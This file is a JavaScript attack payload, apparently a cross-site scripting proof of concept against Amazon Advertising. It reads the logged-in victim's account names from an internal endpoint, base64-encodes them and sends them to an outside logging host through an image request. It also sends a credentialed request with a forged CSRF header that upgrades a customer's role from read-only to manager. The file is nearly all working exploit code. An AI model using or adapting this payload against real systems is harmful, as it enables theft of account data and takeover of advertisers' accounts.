var xhr = new XMLHttpRequest();

xhr.open("GET", "https://advertising.amazon.com/ccx/ajax/navState")

xhr.onload = function() {
    var response = JSON.parse(this.responseText)
    var accountLists = response["accountInfo"]["accounts"]
    var fullName = response["accountInfo"]["currentAccountName"]
    var accounts = ""
    for (let i = 0; i < accountLists[0]["accounts"].length; i++) {
      accounts += accountLists[0]["accounts"][i]["label"] + " [MANAGER ACCOUNT]" + "\n"
    }
    for (let i = 0; i < accountLists[1]["accounts"].length; i++) {
      accounts += accountLists[1]["accounts"][i]["label"] + " [SPONSOR ACCOUNT]" + "\n"
    }
    alert(origin)
    alert("Current Account Name: " + fullName + "\n" + accounts)
    new Image().src="https://icollab.info/log/?data="+encodeURIComponent(btoa("Current Account Name: " + fullName + "\n" + accounts));

}

xhr.send()

function submitRequest() {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https:\/\/advertising.amazon.com\/am\/managerAccounts\/api\/v1\/ma\/amzn1.ads1.ma1.ars8t8gor8ro29tsxpjqqwnyr\/changeRoles", true);
    xhr.setRequestHeader("content-type", "application\/json");
    xhr.setRequestHeader("X-Csrf-Token", "1");
    xhr.withCredentials = true;
    var body = "{\"customerId\":\"A23NSADV919UHB\",\"rolesToAssociate\":[\"MasterAccount_Manager\"],\"rolesToDisassociate\":[\"MA_ReadOnly\"]}";
    var aBody = new Uint8Array(body.length);
    for (var i = 0; i < aBody.length; i++)
      aBody[i] = body.charCodeAt(i); 
    xhr.send(new Blob([aBody]));
}
submitRequest();

